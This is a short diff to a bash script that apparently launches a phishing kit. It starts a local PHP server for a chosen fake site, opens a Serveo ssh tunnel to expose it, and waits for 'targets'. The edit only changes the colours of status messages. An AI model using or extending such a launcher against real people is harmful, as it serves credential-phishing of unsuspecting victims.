@@ -313,10 +313,10 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
 
 
 serverx() {
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
 cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting Serveo...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "Error, openssh is not installed! Aborting..."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
